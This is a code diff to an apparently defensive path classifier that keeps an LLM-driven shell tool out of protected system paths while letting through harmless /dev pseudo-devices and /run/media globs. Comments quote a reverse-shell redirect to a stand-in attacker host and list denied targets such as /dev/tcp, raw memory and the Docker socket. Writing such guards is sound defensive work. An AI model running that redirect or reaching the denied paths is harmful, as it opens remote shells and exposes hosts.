@@ -56,10 +56,10 @@ export interface ProtectedClassifyInput {
 // `/dev` — device nodes are kernel-managed like /proc and /sys.
 // An LLM-driven write to `/dev/sda` would overwrite a raw disk;
 // `cat /dev/tcp/attacker/80 > shell` is the canonical reverse-
-// shell-via-redirect shape. Reads of `/dev/random` or `/dev/zero`
-// are legitimate but rare; refusing them outright pushes
-// operators to explicitly invoke a non-LLM tool, which is the
-// safer default for kernel-managed pseudofs.
+// shell-via-redirect shape — those stay denied. A fixed set of
+// harmless pseudo-devices (`/dev/null`, `/dev/zero`, entropy, tty,
+// std*, `/dev/fd/*`) is carved back out via `isDevSafe` (below) so the
+// ubiquitous `> /dev/null` / `2>/dev/null` idioms aren't refused.
 //
 // `/var/run` + `/run`: both host SOCKETS to privileged daemons —
 // `/var/run/docker.sock` (root container access),
@@ -88,6 +88,64 @@ const SYSTEM_DENY_ROOTS: readonly string[] = ['/proc', '/sys', '/boot', '/dev', 
 // the original threat coverage (privileged daemon sockets stay
 // blocked) without false-positiving user workspaces.
 const SYSTEM_DENY_EXCEPTIONS: readonly string[] = ['/run/media', '/run/user'];
+
+// Safe pseudo-devices carved out of the `/dev` deny tier — kernel-managed
+// and harmless for read AND write. `> /dev/null` / `2>/dev/null` /
+// `< /dev/urandom` are ubiquitous and benign; denying all of `/dev`
+// (the pre-carve-out posture) blocked a huge swath of normal commands.
+// Exact-match the discardable / entropy / tty / std* nodes; prefix-match
+// `/dev/fd/` (the process's own fds). DELIBERATELY excluded — these stay
+// deny: block devices (`/dev/sda*`), raw memory (`/dev/mem`, `/dev/kmem`,
+// `/dev/port`), and the bash-virtual network pseudo-paths
+// (`/dev/tcp/<host>/<port>`, `/dev/udp/...`) which are the canonical
+// reverse-shell-via-redirect shape.
+const SYSTEM_DEV_SAFE_EXACT: ReadonlySet<string> = new Set([
+  '/dev/null',
+  '/dev/zero',
+  '/dev/full',
+  '/dev/random',
+  '/dev/urandom',
+  '/dev/tty',
+  '/dev/stdin',
+  '/dev/stdout',
+  '/dev/stderr',
+]);
+
+// True for the harmless `/dev` pseudo-devices carved out of the deny
+// tier (see SYSTEM_DEV_SAFE_EXACT). Exported so callers can reason about
+// the carve-out; the deny classifier consults it for `/dev` matches.
+export const isDevSafe = (absPath: string): boolean =>
+  SYSTEM_DEV_SAFE_EXACT.has(absPath) || absPath.startsWith('/dev/fd/');
+
+// Glob-reachability carve-out — a deliberate SUBSET of
+// SYSTEM_DENY_EXCEPTIONS. The bash resolver's `couldGlobReachProtected`
+// refuses a glob whose literal prefix sits inside a `/run` deny zone,
+// because the glob could expand into protected content. That check
+// consumes the RAW SYSTEM_DENY_ROOTS (it predates the exceptions
+// list), so before this carve-out a repo checked out on
+// `/run/media/<user>/<volume>` had EVERY glob (`ls *.ts`, `find -name
+// '*.ts'`) refused — the literal prefix resolved under `/run/` and
+// matched the `/run` root. `/run/media` is a removable-media mount:
+// regular operator-owned files, no protected surface, so a glob there
+// is as safe as one under `$HOME` and must NOT be refused.
+//
+// `/run/user` is INTENTIONALLY excluded: a glob under $XDG_RUNTIME_DIR
+// (`/run/user/<uid>/g*`) could expand into the sensitive IPC sockets
+// (`gnupg`, `keyring`, `bus`, Wayland, …) that `isXdgRuntimeSensitive`
+// re-denies, so those stay conservatively refused via the `/run`
+// prefix. Literal (non-glob) `/run/user` paths are still classified
+// precisely by `classifyProtectedPath`; only the can't-pre-expand glob
+// case is held conservative here.
+const GLOB_SAFE_RUN_CARVEOUTS: readonly string[] = ['/run/media'];
+
+// True when a glob's literal prefix sits in a `/run` carve-out where
+// expansion cannot reach any protected target (see
+// GLOB_SAFE_RUN_CARVEOUTS). Used by the bash resolver to keep
+// `couldGlobReachProtected` consistent with `classifyProtectedPath`'s
+// `/run/media` exception — the two must not diverge on what counts as
+// protected, which is exactly the bug this closes.
+export const isGlobSafeRunCarveout = (absPath: string): boolean =>
+  GLOB_SAFE_RUN_CARVEOUTS.some((c) => absPath === c || absPath.startsWith(`${c}/`));
 
 // Subpath names inside /run/user/<uid> that contain user-scoped IPC
 // sockets and credential-adjacent endpoints. The /run/user carve-out
@@ -330,6 +388,10 @@ export const classifyProtectedPath = (input: ProtectedClassifyInput): ProtectedT
       if (isXdgRuntimeSensitive(absPath)) return 'deny';
       continue;
     }
+    // `/dev` safe pseudo-devices (null/zero/entropy/tty/std*/fd) carve
+    // back out of the deny — `> /dev/null` etc. Block devices, raw
+    // memory, and `/dev/tcp|udp` are NOT in the safe set and stay denied.
+    if (root === '/dev' && isDevSafe(absPath)) continue;
     return 'deny';
   }
 
